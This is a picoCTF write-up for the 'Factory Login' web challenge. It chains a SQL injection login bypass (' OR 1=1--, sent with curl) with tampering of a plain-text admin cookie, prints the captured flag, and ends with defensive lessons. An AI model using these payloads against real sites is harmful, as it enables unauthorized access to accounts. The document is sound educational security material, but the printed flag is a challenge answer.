# Factory Login — picoCTF Writeup

## Challenge Info

| Field       | Details                                        |
|-------------|------------------------------------------------|
| Name        | Factory Login                                  |
| Category    | Web Exploitation                               |
| Platform    | picoCTF                                        |
| URL         | `http://fickle-tempest.picoctf.net:62791/`     |

**Description:**
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at?

---

## Solution

### Step 1: Explore the Login Page

The website is a Flask app (Werkzeug/Python) with a simple login form that posts to `/login`.

```bash
curl -s http://fickle-tempest.picoctf.net:62791/
```

No hidden comments, no linked scripts — just a straightforward login form with `user` and `password` fields.

---

### Step 2: SQL Injection to Bypass Login

We need to login as "Joe" but don't know the password. Let's try SQL injection. The classic `' OR 1=1--` payload tells the database "accept any password":

```bash
curl -s -v -X POST http://fickle-tempest.picoctf.net:62791/login \
  -d "user=joe&password=' OR 1=1--" 2>&1
```

**Response headers:**

```
HTTP/1.1 302 FOUND
Location: /flag
Set-Cookie: password="' OR 1=1--"; Path=/
Set-Cookie: username=joe; Path=/
Set-Cookie: admin=False; Path=/
```

The SQL injection works — the server redirects us to `/flag`. But notice the cookies: the server sets `admin=False`. This means there's a second check we need to bypass.

---

### Step 3: Cookie Manipulation — Set admin=True

The server uses a plain-text cookie `admin=False` for authorization. Since cookies are stored on the client side, we can simply change it to `True`:

```bash
curl -s -b "username=joe; password=' OR 1=1--; admin=True" \
  http://fickle-tempest.picoctf.net:62791/flag
```

**Result:**

```html
<p style="text-align:center; font-size:30px;">
  <b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}</code>
</p>
```

---

## Flag

```
picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}
```

---

## Vulnerabilities Exploited

### 1. SQL Injection (Authentication Bypass)

The server constructs a SQL query by directly inserting user input without sanitization. Something like:

```sql
SELECT * FROM users WHERE username='joe' AND password='' OR 1=1--'
```

The `' OR 1=1--` payload:
- `'` closes the password string
- `OR 1=1` makes the condition always true
- `--` comments out the rest of the query

This returns all users, effectively bypassing the password check.

### 2. Insecure Cookie-Based Authorization

The server stores the admin privilege in a plain-text cookie (`admin=False`) and trusts the client to not modify it. Since cookies are fully controlled by the client, changing `False` to `True` is trivial.

---

## Key Takeaways

1. **Always use parameterized queries.** Never concatenate user input into SQL queries. Use prepared statements or ORM frameworks to prevent SQL injection.

2. **Never trust client-side data for authorization.** Storing admin privileges in a cookie is like writing "VIP" on your own wristband. Authorization checks must be done server-side, using signed sessions or tokens (like JWT) that the client cannot forge.

3. **Two vulnerabilities, one exploit chain.** This challenge demonstrates how multiple weak points can be chained together. SQL injection alone got us to the flag page, but we also needed cookie manipulation to get admin access. In real-world pentesting, exploit chains like this are common.

4. **Cookies should be signed or encrypted.** If you must store data in cookies, use a framework's built-in signed cookie mechanism (like Flask's `session`) so the server can detect tampering. Better yet, store sensitive data server-side and only give the client a session ID.
